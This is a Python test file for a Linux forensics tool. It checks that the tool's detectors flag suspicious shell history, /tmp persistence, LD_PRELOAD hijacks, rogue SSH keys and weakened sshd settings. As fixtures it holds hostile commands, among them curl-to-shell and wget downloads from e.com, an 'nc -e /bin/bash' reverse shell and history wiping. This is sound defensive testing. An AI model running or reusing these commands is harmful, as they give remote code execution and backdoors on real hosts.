"""Unit tests for step-7a detectors plus infected/clean end-to-end."""

from __future__ import annotations

from linuxdfir.detectors import (
    account_changes,
    ld_preload,
    masked_services,
    ssh_keys,
    sshd_weakening,
    suspicious_history,
    tmp_persistence,
)
from linuxdfir.schema import Event, Severity


def _event(**kw) -> Event:
    defaults = dict(
        timestamp_utc=None,
        host="test",
        user=None,
        source_artifact="test",
        event_type="test",
        message="",
        evidence_path="/test",
        line_or_offset=1,
    )
    defaults.update(kw)
    return Event(**defaults)


# ------------------------------------------------------ suspicious_history


class TestSuspiciousHistory:
    def test_curl_pipe_sh(self):
        e = _event(
            event_type="shell_command",
            user="alice",
            message="curl http://e.com/x | sh",
            evidence_path="/home/alice/.bash_history",
        )
        findings = suspicious_history.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "T1059" in findings[0].mitre_ids

    def test_wget_to_tmp(self):
        e = _event(
            event_type="shell_command",
            user="root",
            message="wget -O /tmp/.x http://e.com/.x",
            evidence_path="/root/.bash_history",
        )
        findings = suspicious_history.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_chmod_tmp(self):
        e = _event(
            event_type="shell_command",
            user="root",
            message="chmod +x /tmp/.x",
            evidence_path="/root/.bash_history",
        )
        findings = suspicious_history.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_nc_e(self):
        e = _event(
            event_type="shell_command",
            user="alice",
            message="nc -e /bin/bash 10.0.0.1 4444",
            evidence_path="/home/alice/.bash_history",
        )
        findings = suspicious_history.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_history_wipe(self):
        e = _event(
            event_type="shell_command",
            user="root",
            message="history -c",
            evidence_path="/root/.bash_history",
        )
        findings = suspicious_history.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert "T1070.003" in findings[0].mitre_ids

    def test_base64_decode_pipe_sh(self):
        e = _event(
            event_type="shell_command",
            user="root",
            message="echo aGVsbG8= | base64 -d | sh",
            evidence_path="/root/.bash_history",
        )
        findings = suspicious_history.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_benign_command_clean(self):
        e = _event(
            event_type="shell_command",
            user="alice",
            message="ls -la /var/log/",
            evidence_path="/home/alice/.bash_history",
        )
        assert suspicious_history.detect([e]) == []

    def test_grouping_severity_max(self):
        events = [
            _event(
                event_type="shell_command",
                user="alice",
                message="history -c",
                evidence_path="/home/alice/.bash_history",
            ),
            _event(
                event_type="shell_command",
                user="alice",
                message="curl http://e.com/x | sh",
                evidence_path="/home/alice/.bash_history",
            ),
        ]
        findings = suspicious_history.detect(events)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH


# ---------------------------------------------------------- account_changes


class TestAccountChanges:
    def test_multiple_uid0(self):
        events = [
            _event(
                event_type="user_account",
                evidence_path="/etc/passwd",
                message=(
                    "account root: uid=0 gid=0 shell=/bin/bash home=/root "
                    "[interactive-shell]"
                ),
            ),
            _event(
                event_type="user_account",
                evidence_path="/etc/passwd",
                message=(
                    "account sysbackup: uid=0 gid=0 shell=/bin/bash home=/root "
                    "[interactive-shell]"
                ),
            ),
            _event(
                event_type="user_account",
                evidence_path="/etc/passwd",
                message=(
                    "account daemon: uid=1 gid=1 shell=/usr/sbin/nologin home=/usr/sbin "
                    "[no-shell]"
                ),
            ),
        ]
        findings = account_changes.detect(events)
        uid0 = [f for f in findings if "Multiple UID 0" in f.title]
        assert uid0 and uid0[0].severity == Severity.HIGH

    def test_single_uid0_no_finding(self):
        events = [
            _event(
                event_type="user_account",
                evidence_path="/etc/passwd",
                message=(
                    "account root: uid=0 gid=0 shell=/bin/bash home=/root "
                    "[interactive-shell]"
                ),
            ),
        ]
        assert account_changes.detect(events) == []

    def test_nopasswd_sudoers(self):
        e = _event(
            event_type="sudo_rule",
            user="sysbackup",
            evidence_path="/etc/sudoers.d/99-backup",
            message="sudo: sysbackup ALL=(ALL) NOPASSWD: ALL",
            tags=["sudo", "sudoers", "nopasswd"],
        )
        findings = account_changes.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1548.003" in findings[0].mitre_ids

    def test_password_sudoers_no_finding(self):
        e = _event(
            event_type="sudo_rule",
            user="alice",
            evidence_path="/etc/sudoers",
            message="sudo: alice ALL=(ALL) ALL",
            tags=["sudo", "sudoers"],
        )
        assert account_changes.detect([e]) == []


# --------------------------------------------------------- tmp_persistence


class TestTmpPersistence:
    def test_cron_tmp(self):
        e = _event(
            event_type="cron_job",
            user="root",
            evidence_path="/etc/cron.d/evil",
            message="cron [* * * * *] root: /tmp/.x/run.sh",
        )
        findings = tmp_persistence.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1053.003" in findings[0].mitre_ids

    def test_systemd_shm(self):
        e = _event(
            event_type="systemd_exec",
            user="root",
            evidence_path="/etc/systemd/system/system-update.service",
            message="ExecStart=/dev/shm/.cache/upd --daemon (user=root)",
        )
        findings = tmp_persistence.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1543.002" in findings[0].mitre_ids

    def test_benign_cron_no_finding(self):
        e = _event(
            event_type="cron_job",
            user="root",
            evidence_path="/etc/crontab",
            message="cron [0 3 * * *] root: /usr/local/bin/backup.sh",
        )
        assert tmp_persistence.detect([e]) == []


# --------------------------------------------------------------- ld_preload


class TestLdPreloadDetector:
    def test_preload_file(self):
        e = _event(
            event_type="preload_entry",
            evidence_path="/etc/ld.so.preload",
            message="LD_PRELOAD library: /tmp/.lib/libc.so.6",
        )
        findings = ld_preload.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1574.006" in findings[0].mitre_ids

    def test_env_injection(self):
        e = _event(
            event_type="startup_line",
            evidence_path="/etc/profile.d/backdoor.sh",
            message="export LD_PRELOAD=/tmp/evil.so",
        )
        findings = ld_preload.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_systemd_env_injection(self):
        e = _event(
            event_type="systemd_env",
            evidence_path="/etc/systemd/system/env.service",
            message="Environment=LD_PRELOAD=/tmp/evil.so",
        )
        findings = ld_preload.detect([e])
        assert findings and findings[0].severity == Severity.HIGH

    def test_benign_no_finding(self):
        e = _event(
            event_type="preload_entry",
            evidence_path="/etc/ld.so.preload",
            message="LD_PRELOAD library: /lib/x86_64-linux-gnu/libnss.so",
        )
        findings = ld_preload.detect([e])
        assert len(findings) == 1


# --------------------------------------------------------------- ssh_keys


class TestSshKeys:
    def test_multiple_root_keys(self):
        events = [
            _event(
                event_type="ssh_key",
                user="root",
                evidence_path="/root/.ssh/authorized_keys",
                message="ssh key ssh-ed25519 SHA256:aaa legit",
            ),
            _event(
                event_type="ssh_key",
                user="root",
                evidence_path="/root/.ssh/authorized_keys",
                message="ssh key ssh-ed25519 SHA256:bbb attacker",
            ),
        ]
        findings = ssh_keys.detect(events)
        multi = [f for f in findings if "Multiple authorized_keys" in f.title]
        assert multi and multi[0].severity == Severity.MEDIUM

    def test_key_options(self):
        e = _event(
            event_type="ssh_key",
            user="root",
            evidence_path="/root/.ssh/authorized_keys",
            message='ssh key ssh-ed25519 SHA256:aaa cmd [options: command="/usr/bin/backup"]',
            tags=["ssh", "authorized_keys", "key-options"],
        )
        findings = ssh_keys.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_nologin_account_keys(self):
        events = [
            _event(
                event_type="user_account",
                evidence_path="/etc/passwd",
                message=(
                    "account daemon: uid=1 gid=1 shell=/usr/sbin/nologin home=/usr/sbin "
                    "[no-shell]"
                ),
            ),
            _event(
                event_type="ssh_key",
                user="daemon",
                evidence_path="/home/daemon/.ssh/authorized_keys",
                message="ssh key ssh-ed25519 SHA256:ccc backdoor",
            ),
        ]
        findings = ssh_keys.detect(events)
        nologin = [f for f in findings if "non-login" in f.title]
        assert nologin and nologin[0].severity == Severity.HIGH

    def test_single_root_key_no_multi_finding(self):
        e = _event(
            event_type="ssh_key",
            user="root",
            evidence_path="/root/.ssh/authorized_keys",
            message="ssh key ssh-ed25519 SHA256:aaa legit",
        )
        findings = ssh_keys.detect([e])
        assert findings == []


# ---------------------------------------------------------- masked_services


class TestMaskedServices:
    def test_auditd_masked_high(self):
        e = _event(
            event_type="systemd_masked",
            evidence_path="/etc/systemd/system/auditd.service",
            message="masked unit /etc/systemd/system/auditd.service -> /dev/null",
        )
        findings = masked_services.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1562.006" in findings[0].mitre_ids

    def test_cups_masked_info(self):
        e = _event(
            event_type="systemd_masked",
            evidence_path="/etc/systemd/system/cups.service",
            message="masked unit /etc/systemd/system/cups.service -> /dev/null",
        )
        findings = masked_services.detect([e])
        assert findings and findings[0].severity == Severity.INFO

    def test_unknown_masked_low(self):
        e = _event(
            event_type="systemd_masked",
            evidence_path="/etc/systemd/system/weird.service",
            message="masked unit /etc/systemd/system/weird.service -> /dev/null",
        )
        findings = masked_services.detect([e])
        assert findings and findings[0].severity == Severity.LOW


# ---------------------------------------------------------- sshd_weakening


class TestSshdWeakening:
    def test_permit_root_login(self):
        e = _event(
            event_type="sshd_setting",
            evidence_path="/etc/ssh/sshd_config",
            message="sshd: PermitRootLogin yes",
        )
        findings = sshd_weakening.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_password_auth(self):
        e = _event(
            event_type="sshd_setting",
            evidence_path="/etc/ssh/sshd_config",
            message="sshd: PasswordAuthentication yes",
        )
        findings = sshd_weakening.detect([e])
        assert findings and findings[0].severity == Severity.LOW

    def test_empty_passwords(self):
        e = _event(
            event_type="sshd_setting",
            evidence_path="/etc/ssh/sshd_config",
            message="sshd: PermitEmptyPasswords yes",
        )
        findings = sshd_weakening.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_strong_config_no_finding(self):
        events = [
            _event(
                event_type="sshd_setting",
                evidence_path="/etc/ssh/sshd_config",
                message="sshd: PermitRootLogin prohibit-password",
            ),
            _event(
                event_type="sshd_setting",
                evidence_path="/etc/ssh/sshd_config",
                message="sshd: PasswordAuthentication no",
            ),
        ]
        assert sshd_weakening.detect(events) == []


# ------------------------------------------------------- end-to-end infected


class TestEndToEnd:
    RULE_TABLE = {
        "ssh_bruteforce_then_success": 1,
        "ssh_password_spraying": 1,
        "suspicious_history_commands": 1,
        "new_user_or_sudoers_change": 2,
        "persistence_from_tmp_paths": 2,
        "ld_preload_hijack": 1,
        "new_authorized_keys": 1,
        "masked_security_service": 1,
        "sshd_config_weakening": 1,
        "webshell_and_web_attacks": 1,
        "suspicious_package_install": 1,
        "audit_suspicious_exec": 1,
        "login_anomalies": 2,
        "kernel_module_load": 1,
    }

    def test_infected_findings(self, generated, tmp_path):
        import json

        from linuxdfir import cli

        archive = generated["results"]["infected"]["archive"]
        out = tmp_path / "parsed"
        assert cli.main(["parse", str(archive), "-o", str(out)]) == 0
        findings_out = tmp_path / "findings"
        assert cli.main(["detect", str(out), "-o", str(findings_out)]) == 0
        findings = json.loads((findings_out / "findings.json").read_text(encoding="utf-8"))
        by_rule: dict[str, int] = {}
        for f in findings:
            by_rule[f["rule"]] = by_rule.get(f["rule"], 0) + 1
        for rule, expected in self.RULE_TABLE.items():
            assert by_rule.get(rule, 0) >= expected, (
                f"{rule}: expected >= {expected}, got {by_rule.get(rule, 0)}"
            )

    def test_clean_no_high_or_critical(self, generated, tmp_path):
        import json

        from linuxdfir import cli

        archive = generated["results"]["clean"]["archive"]
        out = tmp_path / "parsed"
        assert cli.main(["parse", str(archive), "-o", str(out)]) == 0
        findings_out = tmp_path / "findings"
        assert cli.main(["detect", str(out), "-o", str(findings_out)]) == 0
        findings = json.loads((findings_out / "findings.json").read_text(encoding="utf-8"))
        severe = [f for f in findings if f["severity"] in ("HIGH", "CRITICAL")]
        assert severe == [], (
            f"clean host must have no HIGH/CRITICAL, got: {[f['rule'] for f in severe]}"
        )

    def test_all_detectors_covered(self):
        from linuxdfir.detectors import DETECTOR_MODULES

        rules = set()
        for module in DETECTOR_MODULES:
            rules.update(getattr(module, "RULE_INFO", {}).keys())
        for rule in self.RULE_TABLE:
            assert rule in rules, f"RULE_TABLE references unknown rule {rule}"
